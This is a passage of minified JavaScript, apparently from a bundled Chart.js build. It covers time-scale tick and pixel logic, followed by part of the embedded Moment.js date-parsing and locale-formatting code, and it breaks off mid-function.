r = Hn.indexOf(t); r < s - 1; ++r)if (a = (o = Tn[Hn[r]]).steps ? o.steps[o.steps.length - 1] : Nn, o.common && Math.ceil((n - e) / (a * o.size)) <= i) return Hn[r]; return Hn[s - 1] }(r.minUnit, e, n, i), l = Vn(g), c = Un(r.stepSize, r.unitStepSize), I = "week" === g && r.isoWeekday, u = s.ticks.major.enabled, h = Tn[g], d = e, C = n, A = [], c = c || function (t, e, n, i) { var o, a, s, r = e - t, g = Tn[n], l = g.size, c = g.steps; if (!c) return Math.ceil(r / (i * l)); for (o = 0, a = c.length; o < a && (s = c[o], !(Math.ceil(r / (l * s)) <= i)); ++o); return s }(e, n, g, i); for (I && (d = +a.startOf(d, "isoWeek", I), C = +a.startOf(C, "isoWeek", I)), d = +a.startOf(d, I ? "day" : g), (C = +a.startOf(C, I ? "day" : g)) < n && (C = +a.add(C, 1, g)), o = d, u && l && !I && !r.round && (o = +a.startOf(o, l), o = +a.add(o, ~~((d - o) / (h.size * c)) * c, g)); o < C; o = +a.add(o, c, g))A.push(+o); return A.push(+o), A } var Mn = In.extend({ initialize: function () { this.mergeTicksOptions(), In.prototype.initialize.call(this) }, update: function () { var t = this.options, e = t.time || (t.time = {}), n = this._adapter = new an._date(t.adapters.date); return e.format && console.warn("options.time.format is deprecated and replaced by options.time.parser."), lt.mergeIf(e.displayFormats, n.formats()), In.prototype.update.apply(this, arguments) }, getRightValue: function (t) { return t && void 0 !== t.t && (t = t.t), In.prototype.getRightValue.call(this, t) }, determineDataLimits: function () { for (var t, e, n, i, o = this, a = o.chart, s = o._adapter, r = o.options.time, g = r.unit || "day", l = Nn, c = Wn, I = [], u = [], h = [], d = a.data.labels || [], C = 0, A = d.length; C < A; ++C)h.push(_n(o, d[C])); for (C = 0, A = (a.data.datasets || []).length; C < A; ++C)if (a.isDatasetVisible(C)) if (n = a.data.datasets[C].data, lt.isObject(n[0])) for (u[C] = [], t = 0, e = n.length; t < e; ++t)i = _n(o, n[t]), I.push(i), u[C][t] = i; else { for (t = 0, e = h.length; t < e; ++t)I.push(h[t]); u[C] = h.slice(0) } else u[C] = []; h.length && (h = Rn(h).sort(En), l = Math.min(l, h[0]), c = Math.max(c, h[h.length - 1])), I.length && (I = Rn(I).sort(En), l = Math.min(l, I[0]), c = Math.max(c, I[I.length - 1])), l = _n(o, r.min) || l, c = _n(o, r.max) || c, l = l === Nn ? +s.startOf(Date.now(), g) : l, c = c === Wn ? +s.endOf(Date.now(), g) + 1 : c, o.min = Math.min(l, c), o.max = Math.max(l + 1, c), o._horizontal = o.isHorizontal(), o._table = [], o._timestamps = { data: I, datasets: u, labels: h } }, buildTicks: function () { var t, e, n, i, o, a, s, r, g, l, c = this, I = c.min, u = c.max, h = c.options, d = h.time, C = [], A = []; switch (h.ticks.source) { case "data": C = c._timestamps.data; break; case "labels": C = c._timestamps.labels; break; case "auto": default: C = Ln(c, I, u, c.getLabelCapacity(I)) }for ("ticks" === h.bounds && C.length && (I = C[0], u = C[C.length - 1]), I = _n(c, d.min) || I, u = _n(c, d.max) || u, t = 0, e = C.length; t < e; ++t)I <= (n = C[t]) && n <= u && A.push(n); return c.min = I, c.max = u, c._unit = d.unit || function (t, e, n, i, o) { for (var a, s = Hn.length - 1; s >= Hn.indexOf(n); s--)if (a = Hn[s], Tn[a].common && t._adapter.diff(o, i, a) >= e.length) return a; return Hn[n ? Hn.indexOf(n) : 0] }(c, A, d.minUnit, c.min, c.max), c._majorUnit = Vn(c._unit), c._table = function (t, e, n, i) { if ("linear" === i || !t.length) return [{ time: e, pos: 0 }, { time: n, pos: 1 }]; for (var o, a, s, r = [], g = [e], l = 0, c = t.length; l < c; ++l)e < (a = t[l]) && a < n && g.push(a); for (g.push(n), l = 0, c = g.length; l < c; ++l)s = g[l + 1], o = g[l - 1], a = g[l], void 0 !== o && void 0 !== s && Math.round((s + o) / 2) === a || r.push({ time: a, pos: l / (c - 1) }); return r }(c._timestamps.data, I, u, h.distribution), c._offsets = (i = c._table, o = A, l = g = 0, (a = h).offset && o.length && (a.time.min || (s = Yn(i, "time", o[0], "pos"), g = 1 === o.length ? 1 - s : (Yn(i, "time", o[1], "pos") - s) / 2), a.time.max || (r = Yn(i, "time", o[o.length - 1], "pos"), l = 1 === o.length ? r : (r - Yn(i, "time", o[o.length - 2], "pos")) / 2)), { start: g, end: l }), h.ticks.reverse && A.reverse(), function (t, e, n) { for (var i, o, a = [], s = 0, r = e.length; s < r; ++s)i = e[s], o = !!n && i === +t._adapter.startOf(i, n), a.push({ value: i, major: o }); return a }(c, A, c._majorUnit) }, getLabelForIndex: function (t, e) { var n = this._adapter, i = this.chart.data, o = this.options.time, a = i.labels && t < i.labels.length ? i.labels[t] : "", s = i.datasets[e].data[t]; return lt.isObject(s) && (a = this.getRightValue(s)), o.tooltipFormat ? n.format(On(this, a), o.tooltipFormat) : "string" == typeof a ? a : n.format(On(this, a), o.displayFormats.datetime) }, tickFormatFunction: function (t, e, n, i) { var o = this._adapter, a = this.options, s = a.time.displayFormats, r = s[this._unit], g = this._majorUnit, l = s[g], c = +o.startOf(t, g), I = a.ticks.major, u = I.enabled && g && l && t === c, h = o.format(t, i || (u ? l : r)), d = u ? I : a.ticks.minor, C = Un(d.callback, d.userCallback); return C ? C(h, e, n) : h }, convertTicksToLabels: function (t) { for (var e = [], n = 0, i = t.length; n < i; ++n)e.push(this.tickFormatFunction(t[n].value, n, t)); return e }, getPixelForOffset: function (t) { var e = this, n = e.options.ticks.reverse, i = e._horizontal ? e.width : e.height, o = e._horizontal ? n ? e.right : e.left : n ? e.bottom : e.top, a = Yn(e._table, "time", t, "pos"), s = i * (e._offsets.start + a) / (e._offsets.start + 1 + e._offsets.end); return n ? o - s : o + s }, getPixelForValue: function (t, e, n) { var i = null; if (void 0 !== e && void 0 !== n && (i = this._timestamps.datasets[n][e]), null === i && (i = _n(this, t)), null !== i) return this.getPixelForOffset(i) }, getPixelForTick: function (t) { var e = this.getTicks(); return 0 <= t && t < e.length ? this.getPixelForOffset(e[t].value) : null }, getValueForPixel: function (t) { var e = this, n = e._horizontal ? e.width : e.height, i = e._horizontal ? e.left : e.top, o = (n ? (t - i) / n : 0) * (e._offsets.start + 1 + e._offsets.start) - e._offsets.end, a = Yn(e._table, "pos", o, "time"); return e._adapter._create(a) }, getLabelWidth: function (t) { var e = this.options.ticks, n = this.ctx.measureText(t).width, i = lt.toRadians(e.maxRotation), o = Math.cos(i), a = Math.sin(i); return n * o + Un(e.fontSize, st.global.defaultFontSize) * a }, getLabelCapacity: function (t) { var e = this.options.time.displayFormats.millisecond, n = this.tickFormatFunction(t, 0, [], e), i = this.getLabelWidth(n), o = this.isHorizontal() ? this.width : this.height, a = Math.floor(o / i); return 0 < a ? a : 1 } }), zn = { position: "bottom", distribution: "linear", bounds: "data", adapters: {}, time: { parser: !1, format: !1, unit: !1, round: !1, displayFormat: !1, isoWeekday: !1, minUnit: "millisecond", displayFormats: {} }, ticks: { autoSkip: !1, source: "auto", major: { enabled: !1 } } }; Mn._defaults = zn; var Pn, Kn = { category: un, linear: mn, logarithmic: yn, radialLinear: Zn, time: Mn }, Jn = (function (Ra) { Ra.exports = function () { var e, o; function l() { return e.apply(null, arguments) } function t(t) { e = t } function s(t) { return t instanceof Array || Object.prototype.toString.call(t) === "[object Array]" } function r(t) { return t != null && Object.prototype.toString.call(t) === "[object Object]" } function g(t) { if (Object.getOwnPropertyNames) { return Object.getOwnPropertyNames(t).length === 0 } else { var e; for (e in t) { if (t.hasOwnProperty(e)) { return false } } return true } } function a(t) { return t === void 0 } function c(t) { return typeof t === "number" || Object.prototype.toString.call(t) === "[object Number]" } function I(t) { return t instanceof Date || Object.prototype.toString.call(t) === "[object Date]" } function n(t, e) { var n = [], i; for (i = 0; i < t.length; ++i) { n.push(e(t[i], i)) } return n } function u(t, e) { return Object.prototype.hasOwnProperty.call(t, e) } function h(t, e) { for (var n in e) { if (u(e, n)) { t[n] = e[n] } } if (u(e, "toString")) { t.toString = e.toString } if (u(e, "valueOf")) { t.valueOf = e.valueOf } return t } function d(t, e, n, i) { return Mn(t, e, n, i, true).utc() } function i() { return { empty: false, unusedTokens: [], unusedInput: [], overflow: -2, charsLeftOver: 0, nullInput: false, invalidMonth: null, invalidFormat: false, userInvalidated: false, iso: false, parsedDateParts: [], meridiem: null, rfc2822: false, weekdayMismatch: false } } function C(t) { if (t._pf == null) { t._pf = i() } return t._pf } if (Array.prototype.some) { o = Array.prototype.some } else { o = function (t) { var e = Object(this); var n = e.length >>> 0; for (var i = 0; i < n; i++) { if (i in e && t.call(this, e[i], i, e)) { return true } } return false } } function A(t) { if (t._isValid == null) { var e = C(t); var n = o.call(e.parsedDateParts, function (t) { return t != null }); var i = !isNaN(t._d.getTime()) && e.overflow < 0 && !e.empty && !e.invalidMonth && !e.invalidWeekday && !e.weekdayMismatch && !e.nullInput && !e.invalidFormat && !e.userInvalidated && (!e.meridiem || e.meridiem && n); if (t._strict) { i = i && e.charsLeftOver === 0 && e.unusedTokens.length === 0 && e.bigHour === undefined } if (Object.isFrozen == null || !Object.isFrozen(t)) { t._isValid = i } else { return i } } return t._isValid } function p(t) { var e = d(NaN); if (t != null) { h(C(e), t) } else { C(e).userInvalidated = true } return e } var m = l.momentProperties = []; function f(t, e) { var n, i, o; if (!a(e._isAMomentObject)) { t._isAMomentObject = e._isAMomentObject } if (!a(e._i)) { t._i = e._i } if (!a(e._f)) { t._f = e._f } if (!a(e._l)) { t._l = e._l } if (!a(e._strict)) { t._strict = e._strict } if (!a(e._tzm)) { t._tzm = e._tzm } if (!a(e._isUTC)) { t._isUTC = e._isUTC } if (!a(e._offset)) { t._offset = e._offset } if (!a(e._pf)) { t._pf = C(e) } if (!a(e._locale)) { t._locale = e._locale } if (m.length > 0) { for (n = 0; n < m.length; n++) { i = m[n]; o = e[i]; if (!a(o)) { t[i] = o } } } return t } var b = false; function B(t) { f(this, t); this._d = new Date(t._d != null ? t._d.getTime() : NaN); if (!this.isValid()) { this._d = new Date(NaN) } if (b === false) { b = true; l.updateOffset(this); b = false } } function y(t) { return t instanceof B || t != null && t._isAMomentObject != null } function v(t) { if (t < 0) { return Math.ceil(t) || 0 } else { return Math.floor(t) } } function x(t) { var e = +t, n = 0; if (e !== 0 && isFinite(e)) { n = v(e) } return n } function F(t, e, n) { var i = Math.min(t.length, e.length), o = Math.abs(t.length - e.length), a = 0, s; for (s = 0; s < i; s++) { if (n && t[s] !== e[s] || !n && x(t[s]) !== x(e[s])) { a++ } } return a + o } function Q(t) { if (l.suppressDeprecationWarnings === false && typeof console !== "undefined" && console.warn) { console.warn("Deprecation warning: " + t) } } function G(o, a) { var s = true; return h(function () { if (l.deprecationHandler != null) { l.deprecationHandler(null, o) } if (s) { var t = []; var e; for (var n = 0; n < arguments.length; n++) { e = ""; if (typeof arguments[n] === "object") { e += "\n[" + n + "] "; for (var i in arguments[0]) { e += i + ": " + arguments[0][i] + ", " } e = e.slice(0, -2) } else { e = arguments[n] } t.push(e) } Q(o + "\nArguments: " + Array.prototype.slice.call(t).join("") + "\n" + (new Error).stack); s = false } return a.apply(this, arguments) }, a) } var w = {}, X; function S(t, e) { if (l.deprecationHandler != null) { l.deprecationHandler(t, e) } if (!w[t]) { Q(e); w[t] = true } } function k(t) { return t instanceof Function || Object.prototype.toString.call(t) === "[object Function]" } function D(t) { var e, n; for (n in t) { e = t[n]; if (k(e)) { this[n] = e } else { this["_" + n] = e } } this._config = t; this._dayOfMonthOrdinalParseLenient = new RegExp((this._dayOfMonthOrdinalParse.source || this._ordinalParse.source) + "|" + /\d{1,2}/.source) } function Z(t, e) { var n = h({}, t), i; for (i in e) { if (u(e, i)) { if (r(t[i]) && r(e[i])) { n[i] = {}; h(n[i], t[i]); h(n[i], e[i]) } else if (e[i] != null) { n[i] = e[i] } else { delete n[i] } } } for (i in t) { if (u(t, i) && !u(e, i) && r(t[i])) { n[i] = h({}, n[i]) } } return n } function U(t) { if (t != null) { this.set(t) } } if (l.suppressDeprecationWarnings = false, l.deprecationHandler = null, Object.keys) { X = Object.keys } else { X = function (t) { var e, n = []; for (e in t) { if (u(t, e)) { n.push(e) } } return n } } var W = { sameDay: "[Today at] LT", nextDay: "[Tomorrow at] LT", nextWeek: "dddd [at] LT", lastDay: "[Yesterday at] LT", lastWeek: "[Last] dddd [at] LT", sameElse: "L" }; function N(t, e, n) { var i = this._calendar[t] || this._calendar["sameElse"]; return k(i) ? i.call(e, n) : i } var T = { LTS: "h:mm:ss A", LT: "h:mm A", L: "MM/DD/YYYY", LL: "MMMM D, YYYY", LLL: "MMMM D, YYYY h:mm A", LLLL: "dddd, MMMM D, YYYY h:mm A" }; function H(t) { var e = this._longDateFormat[t], n = this._longDateFormat[t.toUpperCase()]; if (e || !n) { return e } this._longDateFormat[t] = n.replace(/MMMM|MM|DD|dddd/g, function (t) { return t.slice(1) }); return this._longDateFormat[t] } var E = "Invalid date"; function R() { return this._invalidDate } var Y = "%d", O = /\d{1,2}/; function _(t) { return this._ordinal.replace("%d", t) } var V = { future: "in %s", past: "%s ago", s: "a few seconds", ss: "%d seconds", m: "a minute", mm: "%d minutes", h: "an hour", hh: "%d hours", d: "a day", dd: "%d days", M: "a month", MM: "%d months", y: "a year", yy: "%d years" }; function L(t, e, n, i) { var o = this._relativeTime[n]; return k(o) ? o(t, e, n, i) : o.replace(/%d/i, t) } function M(t, e) { var n = this._relativeTime[t > 0 ? "future" : "past"]; return k(n) ? n(e) : n.replace(/%s/i, e) } var z = {}; function P(t, e) { var n = t.toLowerCase(); z[n] = z[n + "s"] = z[e] = t } function K(t) { return typeof t === "string" ? z[t] || z[t.toLowerCase()] : undefined } function J(t) { var e = {}, n, i; for (i in t) { if (u(t, i)) { n = K(i); if (n) { e[n] = t[i] } } } return e } var j = {}; function $(t, e) { j[t] = e } function q(t) { var e = []; for (var n in t) { e.push({ unit: n, priority: j[n] }) } e.sort(function (t, e) { return t.priority - e.priority }); return e } function tt(t, e, n) { var i = "" + Math.abs(t), o = e - i.length, a = t >= 0; return (a ? n ? "+" : "" : "-") + Math.pow(10, Math.max(0, o)).toString().substr(1) + i } var et = /(\[[^\[]*\])|(\\)?([Hh]mm(ss)?|Mo|MM?M?M?|Do|DDDo|DD?D?D?|ddd?d?|do?|w[o|w]?|W[o|W]?|Qo?|YYYYYY|YYYYY|YYYY|YY|gg(ggg?)?|GG(GGG?)?|e|E|a|A|hh?|HH?|kk?|mm?|ss?|S{1,9}|x|X|zz?|ZZ?|.)/g, nt = /(\[[^\[]*\])|(\\)?(LTS|LT|LL?L?L?|l{1,4})/g, it = {}, ot = {}; function at(t, e, n, i) { var o = i; if (typeof i === "string") { o = function () { return this[i]() } } if (t) { ot[t] = o } if (e) { ot[e[0]] = function () { return tt(o.apply(this, arguments), e[1], e[2]) } } if (n) { ot[n] = function () { return this.localeData().ordinal(o.apply(this, arguments), t) } } } function st(t) { if (t.match(/\[[\s\S]/)) { return t.replace(/^\[|\]$/g, "") } return t.replace(/\\/g, "") } function rt(i) { var o = i.match(et), t, a; for (t = 0, a = o.length; t < a; t++) { if (ot[o[t]]) { o[t] = ot[o[t]] } else { o[t] = st(o[t]) } } return function (t) { var e = "", n; for (n = 0; n < a; n++) { e += k(o[n]) ? o[n].call(t, i) : o[n] } return e } } function gt(t, e) { if (!t.isValid()) { return t.localeData().invalidDate() } e = lt(e, t.localeData()); it[e] = it[e] || rt(e); return it[e](t) } function lt(t, e) { var n = 5; function i(t) { return e.longDateFormat(t) || t } nt.lastIndex = 0; while (n >= 0 && nt.test(t)) { t = t.replace(nt, i); nt.lastIndex = 0; n -= 1 } return t } var ct = /\d/, It = /\d\d/, ut = /\d{3}/, ht = /\d{4}/, dt = /[+-]?\d{6}/, Ct = /\d\d?/, At = /\d\d\d\d?/, pt = /\d\d\d\d\d\d?/, mt = /\d{1,3}/, ft = /\d{1,4}/, bt = /[+-]?\d{1,6}/, Bt = /\d+/, yt = /[+-]?\d+/, vt = /Z|[+-]\d\d:?\d\d/gi, xt = /Z|[+-]\d\d(?::?\d\d)?/gi, Ft = /[+-]?\d+(\.\d{1,3})?/, Qt = /[0-9]{0,256}['a-z\u00A0-\u05FF\u0700-\uD7FF\uF900-\uFDCF\uFDF0-\uFF07\uFF10-\uFFEF]{1,256}|[\u0600-\u06FF\/]{1,256}(\s*?[\u0600-\u06FF]{1,256}){1,2}/i, Gt = {}; function wt(t, n, i) { Gt[t] = k(n) ? n : function (t, e) { return t && i ? i : n } } function Xt(t, e) { if (!u(Gt, t)) { return new RegExp(St(t)) } return Gt[t](e._strict, e._locale) } function St(t) { return kt(t.replace("\\", "").replace(/\\(\[)|\\(\])|\[([^\]\[]*)\]|\\(.)/g, function (t, e, n, i, o) { return e || n || i || o })) } function kt(t) { return t.replace(/[-\/\\^$*+?.()|[\]{}]/g, "\\$&") } var Dt = {}; function Zt(t, n) { var e, i = n; if (typeof t === "string") { t = [t] } if (c(n)) { i = function (t, e) { e[n] = x(t) } } for (e = 0; e < t.length; e++) { Dt[t[e]] = i } } function Ut(t, o) { Zt(t, function (t, e, n, i) { n._w = n._w || {}; o(t, n._w, n, i) }) } function Wt(t, e, n) { if (e != null && u(Dt, t)) { Dt[t](e, n._a, n, t) } } var Nt = 0, Tt = 1, Ht = 2, Et = 3, Rt = 4, Yt = 5, Ot = 6, _t = 7, Vt = 8; function Lt(t) { return Mt(t) ? 366 : 365 } function Mt(t) { return t % 4 === 0 && t % 100 !== 0 || t % 400 === 0 } at("Y", 0, 0, function () { var t = this.year(); return t <= 9999 ? "" + t : "+" + t }), at(0, ["YY", 2], 0, function () { return this.year() % 100 }), at(0, ["YYYY", 4], 0, "year"), at(0, ["YYYYY", 5], 0, "year"), at(0, ["YYYYYY", 6, true], 0, "year"), P("year", "y"), $("year", 1), wt("Y", yt), wt("YY", Ct, It), wt("YYYY", ft, ht), wt("YYYYY", bt, dt), wt("YYYYYY", bt, dt), Zt(["YYYYY", "YYYYYY"], Nt), Zt("YYYY", function (t, e) { e[Nt] = t.length === 2 ? l.parseTwoDigitYear(t) : x(t) }), Zt("YY", function (t, e) { e[Nt] = l.parseTwoDigitYear(t) }), Zt("Y", function (t, e) { e[Nt] = parseInt(t, 10) }), l.parseTwoDigitYear = function (t) { return x(t) + (x(t) > 68 ? 1900 : 2e3) }; var zt = Jt("FullYear", true), Pt; function Kt() { return Mt(this.year()) } function Jt(e, n) { return function (t) { if (t != null) { $t(this, e, t); l.updateOffset(this, n); return this } else { return jt(this, e) } } } function jt(t, e) { return t.isValid() ? t._d["get" + (t._isUTC ? "UTC" : "") + e]() : NaN } function $t(t, e, n) { if (t.isValid() && !isNaN(n)) { if (e === "FullYear" && Mt(t.year()) && t.month() === 1 && t.date() === 29) { t._d["set" + (t._isUTC ? "UTC" : "") + e](n, t.month(), ne(n, t.month())) } else { t._d["set" + (t._isUTC ? "UTC" : "") + e](n) } } } function qt(t) { t = K(t); if (k(this[t])) { return this[t]() } return this } function te(t, e) { if (typeof t === "object") { t = J(t); var n = q(t); for (var i = 0; i < n.length; i++) { this[n[i].unit](t[n[i].unit]) } } else { t = K(t); if (k(this[t])) { return this[t](e) } } return this } function ee(t, e) { return (t % e + e) % e } if (Array.prototype.indexOf) { Pt = Array.prototype.indexOf } else { Pt = function (t) { var e; for (e = 0; e < this.length; ++e) { if (this[e] === t) { return e } } return -1 } } function ne(t, e) { if (isNaN(t) || isNaN(e)) { return NaN } var n = ee(e, 12); t += (e - n) / 12; return n === 1 ? Mt(t) ? 29 : 28 : 31 - n % 7 % 2 } at("M", ["MM", 2], "Mo", function () { return this.month() + 1 }), at("MMM", 0, 0, function (t) { return this.localeData().monthsShort(this, t) }), at("MMMM", 0, 0, function (t) { return this.localeData().months(this, t) }), P("month", "M"), $("month", 8), wt("M", Ct), wt("MM", Ct, It), wt("MMM", function (t, e) { return e.monthsShortRegex(t) }), wt("MMMM", function (t, e) { return e.monthsRegex(t) }), Zt(["M", "MM"], function (t, e) { e[Tt] = x(t) - 1 }), Zt(["MMM", "MMMM"], function (t, e, n, i) { var o = n._locale.monthsParse(t, i, n._strict); if (o != null) { e[Tt] = o } else { C(n).invalidMonth = t } }); var ie = /D[oD]?(\[[^\[\]]*\]|\s)+MMMM?/, oe = "January_February_March_April_May_June_July_August_September_October_November_December".split("_"); function ae(t, e) { if (!t) { return s(this._months) ? this._months : this._months["standalone"] } return s(this._months) ? this._months[t.month()] : this._months[(this._months.isFormat || ie).test(e) ? "format" : "standalone"][t.month()] } var se = "Jan_Feb_Mar_Apr_May_Jun_Jul_Aug_Sep_Oct_Nov_Dec".split("_"); function re(t, e) { if (!t) { return s(this._monthsShort) ? this._monthsShort : this._monthsShort["standalone"] } return s(this._monthsShort) ? this._monthsShort[t.month()] : this._monthsShort[ie.test(e) ? "format" : "standalone"][t.month()] } function ge(t, e, n) { var i, o, a, s = t.toLocaleLowerCase(); if (!this._monthsParse) { this._monthsParse = []; this._longMonthsParse = []; this._shortMonthsParse = []; for (i = 0; i < 12; ++i) { a = d([2e3, i]); this._shortMonthsParse[i] = this.monthsShort(a, "").toLocaleLowerCase(); this._longMonthsParse[i] = this.months(a, "").toLocaleLowerCase() } } if (n) { if (e === "MMM") { o = Pt.call(this._shortMonthsParse, s); return o !== -1 ? o : null } else { o = Pt.call(this._longMonthsParse, s); return o !== -1 ? o : null } } else { if (e === "MMM") { o = Pt.call(this._shortMonthsParse, s); if (o !== -1) { return o } o = Pt.call(this._longMonthsParse, s); return o !== -1 ? o : null } else { o = Pt.call(this._longMonthsParse, s); if (o !== -1) { return o } o = Pt.call(this._shortMonthsParse, s); return o !== -1 ? o : null } } } function le(t, e, n) { var i, o, a; if (this._monthsParseExact) { return ge.call(this, t, e, n) } if (!this._monthsParse) { this._monthsParse = []; this._longMonthsParse = []; this._shortMonthsParse = [] } for (i = 0; i < 12; i++) { o = d([2e3, i]); if (n && !this._longMonthsParse[i]) { this._longMonthsParse[i] = new RegExp("^" + this.months(o, "").replace(".", "") + "$", "i"); this._shortMonthsParse[i] = new RegExp("^" + this.monthsShort(o, "").replace(".", "") + "$", "i") } if (!n && !this._monthsParse[i]) { a = "^" + this.months(o, "") + "|^" + this.monthsShort(o, ""); this._monthsParse[i] = new RegExp(a.replace(".", ""), "i") } if (n && e === "MMMM" && this._longMonthsParse[i].test(t)) { return i } else if (n && e === "MMM" && this._shortMonthsParse[i].test(t)) { return i } else if (!n && this._monthsParse[i].test(t)) { return i } } } function ce(t, e) { var n; if (!t.isValid()) { return t } if (typeof e === "string") { if (/^\d+$/.test(e)) { e = x(e) } else { e = t.localeData().monthsParse(e); if (!c(e)) { return t } } } n = Math.min(t.date(), ne(t.year(), e)); t._d["set" + (t._isUTC ? "UTC" : "") + "Month"](e, n); return t } function Ie(t) { if (t != null) { ce(this, t); l.updateOffset(this, true); return this } else { return jt(this, "Month") } } function ue() { return ne(this.year(), this.month()) } var he = Qt; function de(t) { if (this._monthsParseExact) { if (!u(this, "_monthsRegex")) { pe.call(this) } if (t) { return this._monthsShortStrictRegex } else { return this._monthsShortRegex } } else { if (!u(this, "_monthsShortRegex")) { this._monthsShortRegex = he } return this._monthsShortStrictRegex && t ? this._monthsShortStrictRegex : this._monthsShortRegex } } var Ce = Qt; function Ae(t) { if (this._monthsParseExact) { if (!u(this, "_monthsRegex")) { pe.call(this) } if (t) { return this._monthsStrictRegex } else { return this._monthsRegex } } else { if (!u(this, "_monthsRegex")) { this._monthsRegex = Ce } return this._monthsStrictRegex && t ? this._monthsStrictRegex : this._monthsRegex } } function pe() { function t(t, e) { return e.length - t.length } var e = [], n = [], i = [], o, a; for (o = 0; o < 12; o++) { a = d([2e3, o]); e.push(this.monthsShort(a, "")); n.push(this.months(a, "")); i.push(this.months(a, "")); i.push(this.monthsShort(a, "")) } e.sort(t); n.sort(t); i.sort(t); for (o = 0; o < 12; o++) { e[o] = kt(e[o]); n[o] = kt(n[o]) } for (o = 0; o < 24; o++) { i[o] = kt(i[o]) } this._monthsRegex = new RegExp("^(" + i.join("|") + ")", "i"); this._monthsShortRegex = this._monthsRegex; this._monthsStrictRegex = new RegExp("^(" + n.join("|") + ")", "i"); this._monthsShortStrictRegex = new RegExp("^(" + e.join("|") + ")", "i") } function me(t, e, n, i, o, a, s) { var r; if (t < 100 && t >= 0) { r = new Date(t + 400, e, n, i, o, a, s); if (isFinite(r.getFullYear())) { r.setFullYear(t) } } else { r = new Date(t, e, n, i, o, a, s) } return r } function fe(t) { var e; if (t < 100 && t >= 0) { var n = Array.prototype.slice.call(arguments); n[0] = t + 400; e = new Date(Date.UTC.apply(null, n)); if (isFinite(e.getUTCFullYear())) { e.setUTCFullYear(t) } } else { e = new Date(Date.UTC.apply(null, arguments)) } return e } function be(t, e, n) { var i = 7 + e - n, o = (7 + fe(t, 0, i).getUTCDay() - e) % 7; return -o + i - 1 } function Be(t, e, n, i, o) { var a = (7 + n - i) % 7, s = be(t, i, o), r = 1 + 7 * (e - 1) + a + s, g, l; if (r <= 0) { g = t - 1; l = Lt(g) + r } else if (r > Lt(t)) { g = t + 1; l = r - Lt(t) } else { g = t; l = r } return { year: g, dayOfYear: l } } function ye(t, e, n) { var i = be(t.year(), e, n), o = Math.floor((t.dayOfYear() - i - 1) / 7) + 1, a, s; if (o < 1) { s = t.year() - 1; a = o + ve(s, e, n) } else if (o > ve(t.year(), e, n)) { a = o - ve(t.year(), e, n); s = t.year() + 1 } else { s = t.year(); a = o } return { week: a, year: s } } function ve(t, e, n) { var i = be(t, e, n), o = be(t + 1, e, n); return (Lt(t) - i + o) / 7 } function xe(t) { return ye(t, this._week.dow, this._week.doy).week } at("w", ["ww", 2], "wo", "week"), at("W", ["WW", 2], "Wo", "isoWeek"), P("week", "w"), P("isoWeek", "W"), $("week", 5), $("isoWeek", 5), wt("w", Ct), wt("ww", Ct, It), wt("W", Ct), wt("WW", Ct, It), Ut(["w", "ww", "W", "WW"], function (t, e, n, i) { e[i.substr(0, 1)] = x(t) }); var Fe = { dow: 0, doy: 6 }; function Qe() { return this._week.dow } function Ge() { return this._week.doy } function we(t) { var e = this.localeData().week(this); return t == null ? e : this.add((t - e) * 7, "d") } function Xe(t) { var e = ye(this, 1, 4).week; return t == null ? e : this.add((t - e) * 7, "d") } function Se(t, e) { if (typeof t !== "string") { return t } if (!isNaN(t)) { return parseInt(t, 10) } t = e.weekdaysParse(t); if (typeof t === "number") { return t } return null } function ke(t, e) { if (typeof t === "string") { return e.weekdaysParse(t) % 7 || 7 } return isNaN(t) ? null : t } function De(t, e) { return t.slice(e, 7).concat(t.slice(0, e)) } at("d", 0, "do", "day"), at("dd", 0, 0, function (t) { return this.localeData().weekdaysMin(this, t) }), at("ddd", 0, 0, function (t) { return this.localeData().weekdaysShort(this, t) }), at("dddd", 0, 0, function (t) { return this.localeData().weekdays(this, t) }), at("e", 0, 0, "weekday"), at("E", 0, 0, "isoWeekday"), P("day", "d"), P("weekday", "e"), P("isoWeekday", "E"), $("day", 11), $("weekday", 11), $("isoWeekday", 11), wt("d", Ct), wt("e", Ct), wt("E", Ct), wt("dd", function (t, e) { return e.weekdaysMinRegex(t) }), wt("ddd", function (t, e) { return e.weekdaysShortRegex(t) }), wt("dddd", function (t, e) { return e.weekdaysRegex(t) }), Ut(["dd", "ddd", "dddd"], function (t, e, n, i) { var o = n._locale.weekdaysParse(t, i, n._strict); if (o != null) { e.d = o } else { C(n).invalidWeekday = t } }), Ut(["d", "e", "E"], function (t, e, n, i) { e[i] = x(t) }); var Ze = "Sunday_Monday_Tuesday_Wednesday_Thursday_Friday_Saturday".split("_"); function Ue(t, e) { var n = s(this._weekdays) ? this._weekdays : this._weekdays[t && t !== true && this._weekdays.isFormat.test(e) ? "format" : "standalone"]; return t === true ? De(n, this._week.dow) : t ? n[t.day()] : n } var We = "Sun_Mon_Tue_Wed_Thu_Fri_Sat".split("_"); function Ne(t) { return t === true ? De(this._weekdaysShort, this._week.dow) : t ? this._weekdaysShort[t.day()] : this._weekdaysShort } var Te = "Su_Mo_Tu_We_Th_Fr_Sa".split("_"); function He(t) { return t === true ? De(this._weekdaysMin, this._week.dow) : t ? this._weekdaysMin[t.day()] : this._weekdaysMin } function Ee(t, e, n) { var i, o, a, s = t.toLocaleLowerCase(); if (!this._weekdaysParse) { this._weekdaysParse = []; this._shortWeekdaysParse = []; this._minWeekdaysParse = []; for (i = 0; i < 7; ++i) { a = d([2e3, 1]).day(i); this._minWeekdaysParse[i] = this.weekdaysMin(a, "").toLocaleLowerCase(); this._shortWeekdaysParse[i] = this.weekdaysShort(a, "").toLocaleLowerCase(); this._weekdaysParse[i] = this.weekdays(a, "").toLocaleLowerCase() } } if (n) { if (e === "dddd") { o = Pt.call(this._weekdaysParse, s); return o !== -1 ? o : null } else if (e === "ddd") { o = Pt.call(this._shortWeekdaysParse, s); return o !== -1 ? o : null } else { o = Pt.call(this._minWeekdaysParse, s); return o !== -1 ? o : null } } else { if (e === "dddd") { o = Pt.call(this._weekdaysParse, s); if (o !== -1) { return o } o = Pt.call(this._shortWeekdaysParse, s); if (o !== -1) { return o } o = Pt.call(this._minWeekdaysParse, s); return o !== -1 ? o : null } else if (e === "ddd") { o = Pt.call(this._shortWeekdaysParse, s); if (o !== -1) { return o } o = Pt.call(this._weekdaysParse, s); if (o !== -1) { return o } o = Pt.call(this._minWeekdaysParse, s); return o !== -1 ? o : null } else { o = Pt.call(this._minWeekdaysParse, s); if (o !== -1) { return o } o = Pt.call(this._weekdaysParse, s); if (o !== -1) { return o } o = Pt.call(this._shortWeekdaysParse, s); return o !== -1 ? o : null } } } function Re(t, e, n) { var i, o, a; if (this._weekdaysParseExact) { return Ee.call(this, 